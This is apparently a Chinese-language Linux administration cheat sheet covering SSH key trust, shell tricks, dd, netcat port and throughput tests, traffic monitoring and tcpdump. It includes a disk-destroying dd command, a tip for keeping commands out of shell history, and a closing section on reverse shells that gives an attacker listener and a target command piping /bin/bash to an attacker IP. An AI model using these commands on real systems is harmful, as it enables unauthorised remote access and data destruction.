# Linux

## linux服务器互信

```
备注：让两台服务器互信（双方跳转登录不用输入口令）
1. 生成秘钥，并添加信任
我的环境中node1的ip是192.168.168.201，node2的ip是192.168.168.202.
[root@node1 ~]# ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa         #生成rsa
[root@node1 ~]# ssh-copy-id -i  ~/.ssh/id_rsa.pub root@192.168.168.202  #复制201的公钥到202机器上，这样就可以使用在201机器上免密码登录202机器了。

[root@node2 ~]# ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa         #生成rsa
[root@node2 ~]# ssh-copy-id -i  ~/.ssh/id_rsa.pub root@192.168.168.201  #复制202的公钥到201机器上，这样就可以使用在202机器上免密码登录201机器了。
注意：
　　如果远程主机的端口非22端口，需要指定-p port选项。
　　ssh-copy-id是由openssh-clients包提供，没有这个命令可以安装这个包。
     centos6,7使用ssh-copy-id的时候可以不用指定-i选项，centos5必须指定的。
```



## 常用操作

### 修改hostname

```sh
vim /etc/hostname
vim /etc/hosts 修改映射和hostname中的一样
reboot
```

### shell文件操作

```shell
假设我们定义了一个变量为：
file=/dir1/dir2/dir3/my.file.txt

可以用${ }分别替换得到不同的值：
${file#*/}：删掉第一个/ 及其左边的字符串：dir1/dir2/dir3/my.file.txt
${file##*/}：删掉最后一个/  及其左边的字符串：my.file.txt
${file#*.}：删掉第一个.  及其左边的字符串：file.txt
${file##*.}：删掉最后一个.  及其左边的字符串：txt
${file%/*}：删掉最后一个 /  及其右边的字符串：/dir1/dir2/dir3
${file%%/*}：删掉第一个/  及其右边的字符串：(空值)
${file%.*}：删掉最后一个 .  及其右边的字符串：/dir1/dir2/dir3/my.file
${file%%.*}：删掉第一个 .   及其右边的字符串：/dir1/dir2/dir3/my
${file##*.}x 已这个结尾
记忆的方法为：
# 是 去掉左边（键盘上#在 $ 的左边）
%是去掉右边（键盘上% 在$ 的右边）
单一符号是最小匹配；两个符号是最大匹配
${file:0:5}：提取最左边的5 个字节：/dir1
${file:5:5}：提取第5 个字节右边的连续5个字节：/dir2
```

### 快速清空文件的方法

快速清空一个文件，有 N 种方法，我比较喜欢下边这种，因为它最短

```
$ > access.log
```

不过瘾？好吧，我也顺便总结下，其它几种最常见的清空文件的方法

- `: > access.log`
- `true > access.log`
- `cat /dev/null > access.log`
- `echo -n "" > access.log`
- `echo > access.log`
- `truncate -s 0 access.log`

简单解释下， `:` 在 shell 中是一个内置命令，表示 `no-op`，大概就是空语句的意思，所以 `:` 的那个用法，就是执行命令后，什么都没有输出，将空内容覆盖到文件。

### 快速生成大文件

有时候，在 Linux 上，我们需要一个大文件，用于测试上传或下载的速度，通过 `dd` 命令可以快速生成一个大文件

```
$ dd if=/dev/zero of=file.img bs=1M count=1024
```

上述命令，生成一个文件名为 file.img 大小为 1G 的文件。

### 安全擦除硬盘数据

介绍一种擦除硬盘数据的方法，高效，安全。可以通过 `dd` 命令，轻松实现：

```
$ dd if=/dev/urandom of=/dev/sda
```

使用 `/dev/urandom` 生成随机数据，将生成的数据写入 `sda` 硬盘中，相当于安全的擦除了硬盘数据。

当年陈老师，如果学会了这条命令，可能也不会有艳兆门事件了。

###  快速制作系统盘

在 Linux 下制作系统盘，老毛桃神么工具都弱爆了，直接一条命令搞定：

```
$ dd if=ubuntu-server-amd64.iso of=/dev/sdb
```

哈哈，是不是很爽，`sdb` 可以 U 盘，也可以是普通硬盘

### 查看某个进程的运行时间

可能，大部分同学只会使用 `ps aux`，其实可以通过 `-o` 参数，指定只显示具体的某个字段，会得到更清晰的结果。

```
$ ps -p 10167 -o etimes,etime
ELAPSED     ELAPSED
1712055 19-19:34:15
```

通过 `etime` 获取该进程的运行时间，可以很直观地看到，进程运行了 19 天

同样，可以通过 `-o` 指定 `rss` 可以只获取该进程的内存信息。

```
$ ps -p 10167 -o rss
  RSS
 2180
```

### 动态实时查看日志

通过 `tail` 命令 `-f` 选项，可以动态地监控日志文件的变化，非常实用

```
$ tail -f test.log
```

如果想在日志中出现 `Failed` 等信息时立刻停止 tail 监控，可以通过如下命令来实现：

```
$ tail -f test.log | sed '/Failed/ q'
```

###  时间戳的快速转换

时间操作，对程序员来说就是家常便饭。有时候希望能够将时间戳，转换为日期时间，在 Linux 命令行上，也可以快速的进行转换：

```
$ date -d@1234567890 +"%Y-%m-%d %H:%M:%S"
2009-02-14 07:31:30
```

当然，也可以在命令行上，查看当前的时间戳

```
$ date +%s
1617514141
```

### 优雅的计算程序运行时间

在 Linux 下，可以通过 `time` 命令，很容易获取程序的运行时间：

```
$ time ./test
real    0m1.003s
user    0m0.000s
sys     0m0.000s
```

可以看到，程序的运行时间为: `1.003s`。细心的同学，会看到 `real` 貌似不等于 `user` + `sys`，而且还远远大于，这是怎么回事呢？

先来解释下这三个参数的含义：

- `real`：表示的钟表时间，也就是从程序执行到结束花费的时间；
- `user`：表示运行期间，cpu 在用户空间所消耗的时间；
- `sys`：表示运行期间，cpu 在内核空间所消耗的时间；

由于 `user` 和 `sys` 只统计 cpu 消耗的时间，程序运行期间会调用 sleep 发生阻塞，也可能会等待网络或磁盘 IO，都会消耗大量时间。因此对于类似情况，`real` 的值就会大于其它两项之和。

另外，也会遇到 `real` 远远小于 `user` + `sys` 的场景，这是什么鬼情况？

这个更好理解，如果程序在多个 cpu 上并行，那么 `user` 和 `sys` 统计时间是多个 cpu 时间，实际消耗时间 `real` 很可能就比其它两个之和要小了

### 命令行查看ascii码

我们在开发过程中，通常需要查看 `ascii` 码，通过 Linux 命令行就可以轻松查看，而不用去 Google 或 Baidu

```
$ man ascii
```

### 优雅的删除乱码的文件

在 Linux 系统中，会经常碰到名称乱码的文件。想要删除它，却无法通过键盘输入名字，有时候复制粘贴乱码名称，终端可能识别不了，该怎么办？

不用担心，下边来展示下 `find` 是如何优雅的解决问题的。

```
$ ls  -i
138957 a.txt  138959 T.txt  132395 ڹ��.txt

$ find . -inum 132395 -exec rm {} \;
```

命令中，`-inum` 指定的是文件的 `inode` 号，它是系统中每个文件对应的唯一编号，find 通过编号找到后，执行删除操作。

### Linux上获取你的公网IP地址

```
$ curl ip.sb
$ curl ifconfig.me
```

上述两条命令都可以

### 如何批量下载网页资源

在 Linux 系统，通过 `wget` 命令可以轻松下载，而不用写脚本或爬虫

```
$ wget -r -nd -np --accept=pdf http://fast.dpdk.org/doc/pdf-guides/
# --accept：选项指定资源类型格式 pdf
```

### 历史命令使用技巧

- `!!`：重复执行上条命令；
- `!N`：重复执行 history 历史中第 N 条命令，N 可以通过 history 查看；
- `!pw`：重复执行最近一次，以`pw`开头的历史命令，这个非常有用，小编使用非常高频；
- `!$`：表示最近一次命令的最后一个参数；

```
$ vim /root/sniffer/src/main.c
$ mv !$ !$.bak
# 相当于
$ mv /root/sniffer/src/main.c /root/sniffer/src/main.c.bak
```

当前工作目录是 root，想把 main.c 改为 main.c.bak。

### 快速搜索历史命令

可以通过执行 `Ctrl + r`，然后键入要所搜索的命令关键词，进行搜索，回车就可以执行，非常高效。

### 真正的黑客不能忽略技巧

在所要执行的命令前，加一个**空格**，那这条命令就不会被 `history` 保存到历史记录

有时候，执行的命令中包含敏感信息，这个小技巧就显得非常实用了，你也不会再因为忘记执行 `history -c` 而烦恼了。

### 获取系统运行时间

```
cat /proc/uptime| awk -F. '{run_days=$1 / 86400;run_hour=($1 % 86400)/3600;run_minute=($1 % 3600)/60;run_second=$1 % 60;printf("系统已运行：%d天%d时%d分%d秒",run_days,run_hour,run_minute,run_second)}'
```

### 获取文件夹下最新文件创建时间

```
ll -t --time-style '+%Y-%m-%d' |awk 'NR==2' | awk -F ' ' '{print $6}'
```

### 卸载firewalld安装iptables

```bash
systemctl stop firewalld
systemctl disable firewalld
systemctl mask firewalld
yum install -y iptables-services
systemctl restart iptables
systemctl enable iptables
vim /etc/sysconfig/iptables
```



### ping测试

```sh
sh脚本:
#!/bin/bash

if [ "$1" = "start" ];then
  nohup ping -c 100 $2 > /opt/pingTest 2>&1 &
elif [ "$1" = "stop" ];then
  for i in $(ps -ef | grep -v grep |grep -v pingTest |grep ping| awk '{print $2}')
  do
    kill -9 $i
  done
  cat /dev/null > /opt/pingTest
fi
逻辑:
	先传启动或者停止参数和ip参数,把ping的结果发送到一个文件中,前台每隔一秒去获取这个文件把结果显示在前台
```

## 网卡流量检测

### nload

```bash
# 安装依赖包:
yum install -y gcc gcc-c++ make flex byacc libpcap ncurses-devel libpcap-devel   和yum install -y wget
# 获取文件
wget http://www.roland-riegel.de/nload/nload-0.7.4.tar.gz
tar zxvf nload-0.7.4.tar.gz cd nload-0.7.4
cd 进入目录
./configure
make && make install
```

```bash
# 使用介绍:
加入-u 参数，其后可以跟h(表示自动格式化为易读的单位)、b(表示为Bit/s)、k（表示为KBit/s）、m（表示为MBit/s）,g(表示为GBit/s)。例如下面我们输入如命令"nload -u m"，就是以MB为单位。
默认上边Incoming是进入网卡的流量; 
默认下边Outgoing是网卡出去的流量; 
默认右边（Curr当前流量）、（Avg平均流量）、（Min最小流量）、（Max最大流量）、（Ttl流量统计）

# 命令介绍:
nload   网卡名称  -u  以什么单位显示
# 获取流量信息
nload ens33 -u m
```

### iftop

```bash
# 安装依赖包:
yum install libpcap libpcap-devel ncurses ncurses-devel wget
# 下载iftop最新的安装包:
wget http://www.ex-parrot.com/pdw/iftop/download/iftop-1.0pre4.tar.gz
tar xzf iftop-1.0pre4.tar.gz
cd iftop-1.0pre4 
./configure
make && make install
```

```bash
# 使用
ifconfig 查看网卡
ifconfig  |grep UP | grep RUNNING | awk -F: '{print $1}'查看运行的网卡
# 获取流量信息
iftop -i eth0

# 参数:
TX：发送流量
RX：接收流量
TOTAL：总流量
cumm：运行iftop以来的总流量
peak：峰值流量
rates：分别表示过去 2s 10s 40s时间内网卡总的平均流量
```



## 检测TCP/UDP发送接收(netcat)

### 端口测试

A 主机上用 netstat -an 发现端口成功监听了，你在 B 主机上的客户端却无法访问，那么到底是服务错误还是网络无法到达呢？我们当然可以在 B 主机上用 telnet 探测一下：

```bash
telnet 127.0.0.1 8080
```

但 telnet 并不是专门做这事情的，还需要额外安装，所以我们在 B 主机上用 netcat：

```bash
nc -vz 127.0.0.1 8080
```

nc 命令后面的 8080 可以写成一个范围进行扫描：

```bash
nc -v -v -w3 -z 127.0.0.1 8080-8083
两次 -v 是让它报告更详细的内容，-w3 是设置扫描超时时间为 3 秒。
```

### 传输测试

你在配置 iptable 或者安全组策略，禁止了所有端口，但是仅仅开放了 8080 端口，你想测试一下该设置成功与否怎么测试？安装个 nginx 改下端口，外面再用 chrome 访问下或者 telnet/curl 测试下？？还是 python -m 启动简单 http 服务 ？其实不用那么麻烦，在需要测试的 A 主机上：

```bash
nc -l -p 8089
```

这样就监听了 8080 端口，然后在 B 主机上连接过去：

```bash
nc 127.0.0.1 8089
两边就可以会话了，随便输入点什么按回车，另外一边会显示出来
```

### 测试 UDP 会话

两台主机 UDP 数据发送不过去，问题在哪呢？你得先确认一下两台主机之间 UDP 可以到达，这时候没有 nginx 给你用了，怎么测试呢？用 python 写个 udp 的 echo 服务？？运维不会认你写的工具的，即使连不通他也会认为你的程序有 bug，于是 netcat 又登场了，在 A 主机上：

```bash
nc -u -l -p 8080
```

监听 udp 的 8080 端口，然后 B 主机上连上去：

```bash
nc -u 192.168.1.2 8080
```

### 文件传输

你在一台 B 主机上想往 A 主机上发送一个文件怎么办？不能用 scp / szrz 的话？继续 python 写个 http 上传？装个 ftpd 服务？不用那么麻烦，在 A 主机上监听端口：

```bash
nc -l -p 8080 > image.jpg
```

然后再 B 主机上：

```bash
nc 192.168.1.2 8080 < image.jpg
```

### 网速吞吐量测试

服务端:

```bash
nc -l -p 8080 > /dev/null
```

客户端运行 dd 搭配 nc：

```bash
dd if=/dev/zero bs=1MB count=100 | /bin/nc.openbsd -n -N 192.168.1.2 8080
```

结束以后会有结果出来，注意这里使用了 `-N` 代表 stdin 碰到 EOF 后就关闭连接，这里凡是写 `nc` 命令的地方，代表 GNU/OpenBSD 任意版本的 netcat 都可以，显示的指明路径，就代表必须使用特定版本的 netcat，上条命令等效的 GNU 版本是：

```bash
dd if=/dev/zero bs=1MB count=100 | /bin/nc.traditional -n -q0 192.168.1.2 8080
```

其实上面两种方法都把建立连接的握手时间以及 TCP 窗口慢启动的时间给计算进去了，不是特别精确，最精确的方式是搭配 pv 命令（监控统计管道数据的速度），在 A 主机运行：

```bash
nc -l -p 8080 | pv
```

然后再 B 主机运行：

```text
nc 192.168.1.2 8080 < /dev/zero
```

此时 A 主机那端持续收到 B 主机发送过来的数据并通过管道投递给 pv 命令后，你就能看到实时的带宽统计了，pv 会输出一个实时状态：

```bash
 353MiB 0:00:15 [22.4MiB/s] [          <=>  ]
```

让你看到最新的带宽吞吐量，这是最准确的吞吐量测试方法，在不需要 iperf 的情况下，直接使用 nc 就能得到一个准确的数据。



## 硬件IO查看(sysstat)

```sh
# 安装
yum -y install sysstat

# 检查安装是否成功
 sar -V
 
# 手册
    iostat: 输出CPU的统计信息和所有I/O设备的输入输出（I/O）统计信息。
    mpstat: 关于CPU的详细信息（单独输出或者分组输出）。
    pidstat: 关于运行中的进程/任务、CPU、内存等的统计信息。
    sar: 保存并输出不同系统资源（CPU、内存、IO、网络、内核等。。。）的详细信息。
    sadc: 系统活动数据收集器，用于收集sar工具的后端数据。
    sa1: 系统收集并存储sadc数据文件的二进制数据，与sadc工具配合使用
    sa2: 配合sar工具使用，产生每日的摘要报告。
    sadf: 用于以不同的数据格式（CVS或者XML）来格式化sar工具的输出。
    Sysstat: sysstat工具的man帮助页面。
    nfsiostat: NFS（Network File System）的I/O统计信息。
    cifsiostat: CIFS(Common Internet File System)的统计信息。
    
# 文档地址:
https://www.linuxidc.com/Linux/2019-08/160082.htm
```



## 抓包工具wireshark/tcpdump

### tcpdump

**默认启动**

```
tcpdump
```

**监视指定网络接口的数据包**

```bash
tcpdump -i eth0
# 文档手册:https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html
```



## sehll反弹

反弹shell通常适用于如下几种情况：

•目标机因防火墙受限，目标机器只能发送请求，不能接收请求。

•目标机端口被占用。

•目标机位于局域网，或IP会动态变化，攻击机无法直接连接。

•对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。

### netcat

```sh
wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
tar -xvzf netcat-0.7.1.tar.gz
cd netcat-0.7.1
./configure
make && make install
make clean
```

安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。

**攻击机开启本地监听：**

```
netcat -lvvp 2333
```

**目标机主动连接攻击机：**

```
netcat 47.xxx.xxx.72 2333 -e /bin/bash# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
```
